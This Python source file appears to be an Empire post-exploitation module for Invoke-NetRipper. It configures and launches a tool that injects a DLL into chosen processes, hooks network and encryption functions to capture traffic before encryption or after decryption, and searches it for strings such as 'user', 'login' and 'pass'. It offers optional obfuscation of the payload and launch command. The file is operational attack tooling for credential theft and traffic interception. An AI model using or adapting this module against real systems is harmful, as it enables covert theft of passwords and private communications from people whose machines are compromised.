from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-NetRipper',

            'Author': ['Ionut Popescu (@NytroRST)', '@mattifestation', '@harmj0y'],

            'Description': ('Injects NetRipper into targeted processes, which '
                            'uses API hooking in order to intercept network traffic and encryption '
                            'related functions from a low privileged user, being able to capture both '
                            'plain-text traffic and encrypted traffic before encryption/after decryption.'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/NytroRST/NetRipper/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcessID' : {
                'Description'   :   'Specific process ID to inject the NetRipper dll into.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ProcessName' : {
                'Description'   :   'Inject the NetRipper dll into all processes with the given name (i.e. putty).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'LogLocation' : {
                'Description'   :   'Folder location to log sniffed data to.',
                'Required'      :   False,
                'Value'         :   'TEMP'
            },
            'AllData' : {
                'Description'   :   'Switch. Log all data instead of just plaintext.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Datalimit' : {
                'Description'   :   'Data limit capture per request.',
                'Required'      :   False,
                'Value'         :   '4096'
            },
            'SearchStrings' : {
                'Description'   :   'Strings to search for in traffic.',
                'Required'      :   True,
                'Value'         :   'user,login,pass,database,config'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-NetRipper.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = "Invoke-NetRipper "

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if option.lower() == "searchstrings":
                    scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""
                else:
                    if values['Value'] and values['Value'] != '':
                        if values['Value'].lower() == "true":
                            # if we're just adding a switch
                            scriptEnd += " -" + str(option)
                        else:
                            scriptEnd += " -" + str(option) + " " + str(values['Value']) 

        scriptEnd += ";'Invoke-NetRipper completed.'"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
